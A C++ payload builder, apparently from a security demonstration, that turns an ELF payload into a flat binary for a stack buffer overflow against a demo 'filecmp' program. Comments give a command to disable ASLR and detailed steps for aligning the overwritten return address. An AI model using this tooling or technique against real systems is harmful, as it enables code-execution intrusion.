//
// Copyright (C) 2019 Assured Information Security, Inc.
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>

#include <tuple>
#include <string>
#include <array>
#include <fstream>

#include <bfelf_loader.h>

// -----------------------------------------------------------------------------
// Map File
// -----------------------------------------------------------------------------

std::tuple<char *, size_t, int>
map_file(const std::string &filename)
{
    int fd = open(filename.c_str(), O_RDONLY);
    if (fd == -1) {
        throw std::runtime_error("failed to open file: " + filename);
    }

    struct stat s = {};
    if (int ret = fstat(fd, &s); ret == -1) {
        close(fd);
        throw std::runtime_error("failed to fstat file: " + filename);
    }

    auto file = mmap(0, s.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
    if (file == MAP_FAILED) {
        close(fd);
        throw std::runtime_error("failed to mmap file: " + filename);
    }

    return {static_cast<char *>(file), s.st_size, fd};
}

// -----------------------------------------------------------------------------
// The Guts
// -----------------------------------------------------------------------------

// Main
//
// This function takes a payload in an ELF format and converts it to a flat
// binary. We do not ask the compile to create the flat binary for us as
// pic/pie are not supported in flat binary mode, and we want an attack that
// doesn't need the stack's address compiled into it. The reason for this is
// pic/pie requires relocations, and a flat binary doesn't have this
// information like ELF. The problem with ELF is that it needs an ELF loader
// to execute. To solve this issue, we we our own ELF loader to load the ELF
// file into memory and then we save this memory to a file, which is by its
// vary nature, a flat binary.
//
// Note that for the payload to actually work, you will have to turn off a lot
// modern security features. The most important one is ASLR. On Ubuntu this
// can be done using the following (a simple reboot will undo this):
// > echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
//
// For the payload to work, we also need to patch the payload with the
// addresses of the stack and the functions that we depend on. How this address
// information is gathered depends on the attack. In this example, the app that
// we attack is statically compiled with ASLR turned off which means that we
// can get the address information directly from the application itself and
// the stack address is known.
//
// WARNING (HELP ME!!!!):
//
// For the attack to work, there are two different things that are needed.
// - the address of buffer1 must match. To get this, add the following to the
//   the filecmp source code and rerun the attack using `make attack`
//   std::cout << &buffer1 << '\n';
//
//   it is important that you use `make attack` as the address of buffer1 will
//   change based on the arguments it is provided. Once you know the address,
//   update the address below and recompile. In most situations, this should
//   be enough to make the attack work. If it doesn't, move onto step #2
//
// - the distance of buffer1 from the ret address must also be the same. As
//   of GCC 7 and 8, this seems to work fine. An older or newer version of
//   GCC might change this location as there are a lot of variables that are
//   added to the stack to make this work, which could all be moved around.
//   To fix this, the solution is a bit more involved. In the payload, there
//   is a stack section with some padding. You will need to adjust this padding
//   so that the return address overlaps with the return address on the stack.
//   The easiest way to do this is to add a loop to the filecmp source code
//   that starts at the end of buffer1 and outputs 20-40 void * values from
//   the end of the buffer. This will output the stack. In there, you will see
//   different values. You are looking for the return address of the main
//   function. If you take the different values and grep them in the filecmp
//   executable using objdump -d, you can see where in the code the address
//   points to. You will know you found the right address when you see a call
//   that is preceeded by a move to edi, rsi and rdx, with rdx being set to
//   envp. This is the call to the main function (note that it will set
//   edi and not rdi since argc is an int which is 32bits). Once you know the
//   location in the stack, adjust the padding until the overflow overwrites
//   the return address with the location of buffer1, which will cause the
//   filecmp to execute from the stack, which should have the payload in it.
//   Also note that when you write your loop that outputs the stack, make sure
//   that your iterator is not defined in the main function as this will add
//   another variable to the stack. Once you remove the loop, the stack layout
//   will change, so just make sure any variables you add to the main function
//   for debugging the attack are global.
//
// Arguments
//
// 1: payload
// 2: output file (payload.bin)
// 3: address of open
// 4: address of filesize
// 5: address of filemmap
// 6: address of exit
// 7: address of malloc
// 8: address of write
// 9: address of mprotect
// 10: address of fprintf
// 11: address of stderr
//
int main(int argc, char *argv[])
{
    if (argc != 12) {
        throw std::runtime_error("wrong number of arguments");
        exit(1);
    }

    // -------------------------------------------------------------------------
    // Map files

    auto [payload, payload_size, payload_fd] = map_file(argv[1]);

    // -------------------------------------------------------------------------
    // Address Information

    uint64_t addr_buffer1 = 0x7fffffffba90;
    uint64_t addr_open = std::stoull(argv[3], nullptr, 16);
    uint64_t addr_filesize = std::stoull(argv[4], nullptr, 16);
    uint64_t addr_filemmap = std::stoull(argv[5], nullptr, 16);
    uint64_t addr_exit = std::stoull(argv[6], nullptr, 16);
    uint64_t addr_malloc = std::stoull(argv[7], nullptr, 16);
    uint64_t addr_write = std::stoull(argv[8], nullptr, 16);
    uint64_t addr_mprotect = std::stoull(argv[9], nullptr, 16);
    uint64_t addr_fprintf = std::stoull(argv[10], nullptr, 16);
    uint64_t addr_stderr = std::stoull(argv[11], nullptr, 16);

    // -------------------------------------------------------------------------
    // Convert ELF to flat binary

    struct bfelf_file_t ef;
    if (bfelf_file_init(payload, &ef) != BFSUCCESS) {
        throw std::runtime_error("failed to init the payload ELF file");
    }

    auto exec = new char[ef.size];
    if (exec == nullptr) {
        throw std::runtime_error("failed to allocate memory for the payload ELF file");
    }

    if (bfelf_file_load(&ef, exec, nullptr) != BFSUCCESS) {
        throw std::runtime_error("failed to load the payload ELF file");
    }

    munmap(payload, payload_size);
    close(payload_fd);

    if (bfelf_file_relocate(&ef, addr_buffer1) != BFSUCCESS) {
        throw std::runtime_error("failed to load the payload ELF file");
    }

    // -------------------------------------------------------------------------
    // Patch the flat binary

    std::array<std::pair<uint64_t, uint64_t>, 10> mappings {
        std::pair{0xDEADBEEF00000000, addr_buffer1},
        std::pair{0xDEADBEEF00000001, addr_open},
        std::pair{0xDEADBEEF00000002, addr_filesize},
        std::pair{0xDEADBEEF00000003, addr_filemmap},
        std::pair{0xDEADBEEF00000004, addr_exit},
        std::pair{0xDEADBEEF00000005, addr_malloc},
        std::pair{0xDEADBEEF00000006, addr_write},
        std::pair{0xDEADBEEF00000007, addr_mprotect},
        std::pair{0xDEADBEEF00000008, addr_fprintf},
        std::pair{0xDEADBEEF00000009, addr_stderr}
    };

    for (auto i = 0ULL; i < ef.size - sizeof(uint64_t) + 1; i++) {
        for (const auto &p : mappings) {
            auto ptr = reinterpret_cast<uint64_t *>(&exec[i]);
            if (*ptr == p.first) {
                *ptr = p.second;
            }
        }
    }

    // -------------------------------------------------------------------------
    // Output the flat binary

    if (auto stream = std::fstream(argv[2], std::fstream::out | std::fstream::binary)) {
        stream.write(exec, ef.size);
    }

    delete [] exec;

    // -------------------------------------------------------------------------
    // Done

    return 0;
}
